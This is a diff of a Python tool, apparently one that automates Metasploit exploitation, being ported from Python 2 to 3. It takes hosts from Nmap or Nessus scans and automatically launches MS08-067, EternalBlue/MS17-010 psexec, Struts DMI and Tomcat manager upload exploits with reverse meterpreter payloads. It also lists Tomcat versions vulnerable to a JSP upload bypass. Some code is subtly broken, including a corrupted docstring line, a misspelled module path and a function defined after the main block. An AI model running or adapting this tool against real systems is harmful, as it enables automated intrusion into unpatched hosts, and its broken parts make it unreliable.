@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 import re
 import os
@@ -26,21 +26,21 @@ def parse_args():
     parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
     parser.add_argument("-x", "--xml", help="Nmap XML file")
     parser.add_argument("-n", "--nessus", help="Nessus .nessus file")
-    parser.add_argument("--nmap-args", help='Additional Nmap args, e.g. --nmap-args="--top-ports 1000 --max-rtt-timeout 300"')
+    parser.add_argument("--nmap-args", default='', help='Additional Nmap args, e.g. --nmap-args="--top-ports 1000 --max-rtt-timeout 300"')
     return parser.parse_args()
 
 # Colored terminal output
 def print_bad(msg):
-    print(colored('[-] ', 'red') + msg)
+    print((colored('[-] ', 'red') + msg))
 
 def print_info(msg):
-    print(colored('[*] ', 'blue') + msg)
+    print((colored('[*] ', 'blue') + msg))
 
 def print_good(msg):
-    print(colored('[+] ', 'green') + msg)
+    print((colored('[+] ', 'green') + msg))
 
 def print_great(msg):
-    print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))
+    print((colored('[!] {}'.format(msg), 'yellow', attrs=['bold'])))
 
 def run_proc(cmd):
     '''
@@ -187,7 +187,7 @@ def get_hosts(report, nse):
                     port = str(s.port)
 
                     if nse == False:
-                        print '          {} - {}'.format(port, banner)
+                        print('          {} - {}'.format(port, banner))
 
 
     if nse == False:
@@ -216,7 +216,7 @@ def check_named_pipes(c_id, ip, nmap_os):
     '''
     ['RHOSTS => 192.168.243.129',
        '[*] 192.168.243.129:445   - Pipes: \\netlogon, \\lsarpc, \\samr, \\atsvc, \\epmapper, \\eventlog, \\InitShutdown, \\lsass, \\LSM_API_service, \\ntsvcs, \\protected_storage, \\scerpc, \\srvsvc, \\W32TIME_ALT, \\wkssvc',
-       '[*] Scanned 1 of 1 hosts (100% complete)',
+       '[*] Scanned 1 of 1 hosts (100% complete)['consoles'],
        '[*] Auxiliary module execution completed']
     '''
 
@@ -285,11 +285,11 @@ def run_console_cmd(c_id, cmd):
         l = l.strip()
         if l != '':
             print_info('    {}'.format(l))
-    print ''
+    print('')
     CLIENT.call('console.write',[c_id, cmd])
     time.sleep(3)
     mod_output = wait_on_busy_console(c_id)
-    print ''
+    print('')
 
     return mod_output
 
@@ -297,10 +297,10 @@ def get_req_opts(c_id, module):
     req_opts = []
     opts = CLIENT.call('module.options', [c_id, module])
     for opt_name in opts:
-        if 'required' in opts[opt_name]:
-            if opts[opt_name]['required'] == True:
-                if 'default' not in opts[opt_name]:
-                    req_opts.append(opt_name)
+        if b'required' in opts[opt_name]:
+            if opts[opt_name][b'required'] == True:
+                if b'default' not in opts[opt_name]:
+                    req_opts.append(opt_name.decode('utf8'))
     return req_opts
 
 def get_rhost_var(c_id, module):
@@ -319,6 +319,7 @@ def get_payload(module, operating_sys):
     Automatically get compatible payloads
     '''
     payload = None
+    payloads = []
     win_payloads = ['windows/meterpreter/reverse_https',
                     'windows/x64/meterpreter/reverse_https',
                     'java/meterpreter/reverse_https',
@@ -328,16 +329,19 @@ def get_payload(module, operating_sys):
                      'java/jsp_shell_reverse_tcp',
                      'cmd/unix/reverse']
 
-    payloads = CLIENT.call('module.compatible_payloads',[module])
+    
+    payloads_dict = CLIENT.call('module.compatible_payloads', [module])
 
-    if 'error' in payloads:
+    if b'error' in payloads_dict:
         if 'auxiliary' not in module:
             print_bad('Error getting payload for {}'.format(module))
         else:
             # For aux modules we just set an arbitrary real payload
             payload = win_payloads[0]
     else:
-        payloads = payloads['payloads']
+        byte_payloads = payloads_dict[b'payloads']
+        for p in byte_payloads:
+            payloads.append(p.decode('utf8'))
 
     # Set a preferred payload based on OS
     if 'windows' in operating_sys.lower():
@@ -353,27 +357,12 @@ def get_payload(module, operating_sys):
     if payload == None:
         if 'auxiliary' not in module:
             print_bad('No preferred payload found, first and last comapatible payloads:')
-            print '    '+payloads[0]
-            print '    '+payloads[-1]
+            print('    '+payloads[0])
+            print('    '+payloads[-1])
             print_info('Skipping this exploit')
             return
 
-        payload = win_payloads[0]
-
     return payload
-
-def check_nse_vuln_scripts(host, script):
-    '''
-    Check if host if vulnerable via nse script
-    '''
-    ip = host.address
-    for script_out in host.scripts_results:
-        if script_out['id'] == script:
-            if 'State: VULNERABLE' in script_out['output']:
-                print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
-                return True
-
-    return False
 
 def check_vuln(c_id):
     '''
@@ -409,8 +398,8 @@ def run_nessus_exploits(c_id, exploits):
         # convert mod_desc into mod_path
         path = None
         for mod in all_mods:
-            if mod['name'] == mod_desc:
-                path = mod['fullname']
+            if mod[b'name'].decode('utf8') == mod_desc:
+                path = mod[b'fullname'].decode('utf8')
                 print_info('Using module {}'.format(path))
         if not path:
             print_bad('Error finding module with description: {}'.format(mod_desc))
@@ -451,6 +440,7 @@ def get_nse_scripts(hosts):
                         nse_scripts[ip][port] = smb_scripts
                     else:
                         nse_scripts[ip] = {port:smb_scripts}
+
                 # Run HTTP scripts
                 elif 'http' in s.service:
                     http_scripts = ['http-title']
@@ -458,6 +448,7 @@ def get_nse_scripts(hosts):
                         nse_scripts[ip][port] = http_scripts
                     else:
                         nse_scripts[ip] = {port:http_scripts}
+
     return nse_scripts
 
 def run_nse_scripts(nse_scripts):
@@ -487,21 +478,105 @@ def run_nmap_exploits(c_id, hosts, nse_hosts):
     '''
     Checks for exploitable services on a host
     '''
-    for host in nse_hosts:
-        # First check for ms08_067 and ms17_010
-        ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
-        ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
-        if ms08_vuln == True:
-            mod_output = run_ms08(c_id, host)
-        if ms17_vuln == True:
-            mod_output = run_ms17(c_id, host)
+    for nse_host in nse_hosts:
 
-    for h in hosts:
+        # Check for host script results
+        ms08_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms08-067')
+        if ms08_vuln:
+            mod = 'exploit/windows/smb/ms08_067_netapi'
+            port = '445'
+            mod_out = run_msf_module(c_id, nse_host, mod, port, '')
+
+        ms17_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms17-010')
+        if ms17_vuln:
+            mod_out = run_ms17(c_id, nse_host)
+
+        # Check for service script results
+        for s in nse_host.services:
+            if s.open():
+                port = str(s.port)
+                for script in s.scripts_results:
+                    if script['id'] == 'http-title':
+                        script_out = script['output']
+                        tomcat_vuln = is_tomcat_jsp_upload_vuln(script_out)
+                        if tomcat_vuln:
+                            mod = 'expoit/multi/http/tomcat_mgr_deploy'
+                            mod_out = run_msf_module(c_id, nse_host, mod, port, '')
+
+    # These are the regular first Nmap hosts, no scripts
+    for host in hosts:
         for s in host.services:
             if s.open():
-                if 'Apache Tomcat/Coyote JSP engine version: 1.1' in s.banner:
-                    port = str(s.port)
-                    mod_output = run_struts_dmi_rest_exec(c_id, h, port)
+                port = str(s.port)
+                # Can Struts be run without Tomcat? Maybe, but seems really rare
+                if 'Apache Tomcat/Coyote JSP engine' in s.banner:
+                    # Struts DMI REST exec
+                    struts_mod = 'exploit/multi/http/struts_dmi_rest_exec'
+                    mod_out = run_msf_module(c_id, host, struts_mod, port, '')
+                    # Tomcat manager upload with default creds
+                    tomcat_mgr_mod = 'exploit/multi/http/tomcat_mgr_upload'
+                    mod_out = run_msf_module(c_id, host, tomcat_mgr_mod, port, '')
+
+def check_nse_host_scripts(host, script):
+    '''
+    Check if host if vulnerable via nse script
+    '''
+    ports = []
+    ip = host.address
+
+    for s in host.scripts_results:
+        if s['id'] == script:
+            if 'State: VULNERABLE' in s['output']:
+                print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
+                return True
+
+    return False
+
+def run_msf_module(c_id, host, mod, port, extra_opts):
+    ip = host.address
+    rhost_var = get_rhost_var(c_id, mod)
+    nmap_os = get_nmap_os(host)
+    payload = get_payload(mod, nmap_os)
+    cmd = create_msf_cmd(mod, rhost_var, ip, port, payload, extra_opts)
+    settings_out = run_console_cmd(c_id, cmd)
+    print_info('Checking if host is vulnerable...')
+    output = run_if_vuln(c_id, cmd)
+
+def run_ms17(c_id, host):
+    '''
+    Exploit ms17_010
+    '''
+    # Check for named pipe availability (preVista you could just grab em)
+    # If we find one, then use Romance/Synergy instead of Blue
+    ip = host.address
+    port = '445'
+    nmap_os = get_nmap_os(host)
+    named_pipe = None
+
+    named_pipes = check_named_pipes(c_id, ip, nmap_os)
+
+    # Just use the first named pipe
+    if named_pipes:
+        print_good('Named pipe found! Performing more reliable ms17_010_psexec instead of eternalblue')
+        named_pipe = named_pipes[0]
+        mod = 'exploit/windows/smb/ms17_010_psexec'
+        extra_opts = 'set NAMEDPIPE {}'.format(named_pipe)
+    else:
+        print_info('Named pipe not found. Performing ms17_010_eternalblue')
+        mod = 'exploit/windows/smb/ms17_010_eternalblue'
+        extra_opts = 'set MaxExploitAttempts 6'
+    
+    mod_out = run_msf_module(c_id, host, mod, port, extra_opts)
+
+    return mod_out
+
+def is_tomcat_jsp_upload_vuln(nse_out):
+    tomcat_ver_re = re.search('Tomcat/([1-9]\.[0|5]\.\d+)', nse_out)
+    if tomcat_ver_re:
+        ver = tomcat_ver_re.group(1)
+        if ver in jsp_upload_bypass_tomcat_vers():
+            return True
+    return False
 
 def run_if_vuln(c_id, cmd):
     is_vulnerable = check_vuln(c_id)
@@ -511,82 +586,17 @@ def run_if_vuln(c_id, cmd):
 
         return mod_out
 
-def run_struts_dmi_rest_exec(c_id, host, port):
-    path = 'exploit/multi/http/struts_dmi_rest_exec'
-    ip = host.address
-    rhost_var = get_rhost_var(c_id, path)
-    opts = ''
-    nmap_os = get_nmap_os(host)
-    payload = get_payload(path, nmap_os)
-    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
-    settings_out = run_console_cmd(c_id, cmd)
-    print_info('Checking if host is vulnerable...')
-    output = run_if_vuln(c_id, cmd)
-    return output
-
-def run_ms08(c_id, host):
-    '''
-    Exploit ms08_067
-    '''
-    path = 'exploit/windows/smb/ms08_067_netapi'
-    ip = host.address
-    nmap_os = get_nmap_os(host)
-    port = '445'
-    rhost_var = get_rhost_var(c_id, path)
-    opts = ''
-    payload = get_payload(path, nmap_os)
-    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
-    settings_out = run_console_cmd(c_id, cmd)
-    print_info('Checking if host is vulnerable...')
-    output = run_if_vuln(c_id, cmd)
-    return output
-
-def run_ms17(c_id, host):
-    '''
-    Exploit ms17_010
-    '''
-    # Check for named pipe availability (preVista you could just grab em)
-    # If we find one, then use Romance/Synergy instead of Blue
-    ip = host.address
-    nmap_os = get_nmap_os(host)
-    named_pipe = None
-    named_pipes = check_named_pipes(c_id, ip, nmap_os)
-
-    # Just use the first named pipe
-    if named_pipes:
-        print named_pipes #1111
-        print_good('Named pipe found! Performing more reliable ms17_010_psexec instead of eternalblue')
-        named_pipe = named_pipes[0]
-        path = 'exploit/windows/smb/ms17_010_psexec'
-        opts = 'set NAMEDPIPE {}'.format(named_pipe)
-    else:
-        print_info('Named pipe not found. Performing ms17_010_eternalblue')
-        path = 'exploit/windows/smb/ms17_010_eternalblue'
-        opts = 'set MaxExploitAttempts 6'
-
-    port = '445'
-    opts = ''
-    rhost_var = get_rhost_var(c_id, path)
-    payload = get_payload(path, nmap_os)
-    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
-    settings_out = run_console_cmd(c_id, cmd)
-    print_info('Checking if host is vulnerable...')
-    output = run_if_vuln(c_id, cmd)
-
-    return output
-
 def print_cur_output(c_id):
     output = []
-    cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
+    cur_output = CLIENT.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
     for l in cur_output:
         l = l.strip()
         if l != '':
             output.append(l)
             if re.search('Session . created in the background', l):
-                print ''
                 print_great(l)
             else:
-                print '    '+l
+                print('    '+l)
 
     return output
 
@@ -599,11 +609,11 @@ def wait_on_busy_console(c_id):
     what the right list offset might be
     '''
     output = []
-    list_offset = int([x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0])
+    list_offset = int([x[b'id'] for x in CLIENT.call('console.list')[b'consoles'] if x[b'id'] is bytes(c_id, 'utf8')][0])
     # Get any initial output
     cur_out = print_cur_output(c_id)
     output += cur_out
-    while CLIENT.call('console.list')['consoles'][list_offset]['busy'] == True:
+    while CLIENT.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
         cur_out = print_cur_output(c_id)
         output += cur_out
         time.sleep(1)
@@ -622,16 +632,15 @@ def main(report, args):
     CLIENT.call('auth.token_add', ['Au70PwN'])
     CLIENT.token = 'Au70PwN'
 
-    c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
+    c_ids = [x[b'id'] for x in CLIENT.call('console.list')[b'consoles']]
 
     if len(c_ids) == 0:
         CLIENT.call('console.create')
-        c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
-        # Wait for response
+        c_ids = [x[b'id'] for x in CLIENT.call('console.list')[b'consoles']] # Wait for response
         time.sleep(2)
 
     # Get the latest console
-    c_id = c_ids[-1]
+    c_id = c_ids[-1].decode('utf8')
 
     if args.nessus:
         # exploits = {'msf_module_name':[(ip, port), (ip, port)]
@@ -657,6 +666,47 @@ if __name__ == "__main__":
     else:
         report = parse_nmap(args)
     main(report, args)
+
+def jsp_upload_bypass_tomcat_vers():
+    return ['9.0.0', '8.5.1',  '8.5.2', '8.5.3', 
+            '8.5.4', '8.5.5', '8.5.6', '8.5.7', 
+            '8.5.8', '8.5.9', '8.5.10', '8.5.11', 
+            '8.5.12', '8.5.13', '8.5.14', '8.5.15', 
+            '8.5.16', '8.5.17', '8.5.18', '8.5.19', 
+            '8.5.20', '8.5.21', '8.5.22', '8.0.0',
+            '8.0.1','8.0.2','8.0.3','8.0.4',
+            '8.0.5','8.0.6','8.0.7','8.0.8',
+            '8.0.9','8.0.10','8.0.11','8.0.12',
+            '8.0.13','8.0.14','8.0.15','8.0.16',
+            '8.0.17','8.0.18','8.0.19','8.0.20',
+            '8.0.21','8.0.22','8.0.23','8.0.24',
+            '8.0.25','8.0.26','8.0.27','8.0.28',
+            '8.0.29','8.0.30','8.0.31','8.0.32',
+            '8.0.33','8.0.34','8.0.35','8.0.36',
+            '8.0.37','8.0.38','8.0.39','8.0.40',
+            '8.0.41','8.0.42','8.0.43','8.0.44',
+            '8.0.45','8.0.46','7.0.0','7.0.1',
+            '7.0.2','7.0.3','7.0.4','7.0.5',
+            '7.0.6','7.0.7','7.0.8','7.0.9',
+            '7.0.10','7.0.11','7.0.12','7.0.13',
+            '7.0.14','7.0.15','7.0.16','7.0.17',
+            '7.0.18','7.0.19','7.0.20','7.0.21',
+            '7.0.22','7.0.23','7.0.24','7.0.25',
+            '7.0.26','7.0.27','7.0.28','7.0.29',
+            '7.0.30','7.0.31','7.0.32','7.0.33',
+            '7.0.34','7.0.35','7.0.36','7.0.37',
+            '7.0.38','7.0.39','7.0.40','7.0.41',
+            '7.0.42','7.0.43','7.0.44','7.0.45',
+            '7.0.46','7.0.47','7.0.48','7.0.49',
+            '7.0.50','7.0.51','7.0.52','7.0.53',
+            '7.0.54','7.0.55','7.0.56','7.0.57',
+            '7.0.58','7.0.59','7.0.60','7.0.61',
+            '7.0.62','7.0.63','7.0.64','7.0.65',
+            '7.0.66','7.0.67','7.0.68','7.0.69',
+            '7.0.70','7.0.71','7.0.72','7.0.73',
+            '7.0.74','7.0.75','7.0.76','7.0.77',
+            '7.0.78','7.0.79','7.0.80','7.0.81']
+
 
 #TODO
 # Make Nmap smarter so it only runs NSE scripts that haven't already been ran
